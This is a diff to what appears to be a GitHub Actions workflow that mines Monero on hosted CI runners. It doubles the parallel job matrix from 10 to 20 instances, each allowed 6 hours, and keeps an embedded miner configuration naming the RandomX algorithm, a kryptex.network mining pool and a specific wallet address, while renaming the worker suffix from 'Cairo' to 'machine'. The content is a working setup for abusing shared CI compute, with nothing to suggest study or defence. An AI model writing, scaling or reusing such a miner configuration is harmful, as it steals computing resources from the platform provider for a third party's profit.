@@ -8,7 +8,7 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]  # 10 parallel jobs
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]  # 20 parallel jobs
       fail-fast: false
     timeout-minutes: 360  # 6 hours max
 
@@ -42,7 +42,7 @@ jobs:
                       "algo": "rx/0",
                       "coin": "monero",
                       "url": "xmr.kryptex.network:7029",
-                      "user": "461ys28cKUvdh7JLedMUPu7QDE5CVaSyU35QtzJ9WwFS7pk4UA8fnncD6JtANLhgDSQFWT5YSADmpV6vwZh29S769kptmTm/Cairo-${{ matrix.instance }}",
+                      "user": "461ys28cKUvdh7JLedMUPu7QDE5CVaSyU35QtzJ9WwFS7pk4UA8fnncD6JtANLhgDSQFWT5YSADmpV6vwZh29S769kptmTm/machine-${{ matrix.instance }}",
                       "pass": "x",
                       "tls": false,
                       "keepalive": true,
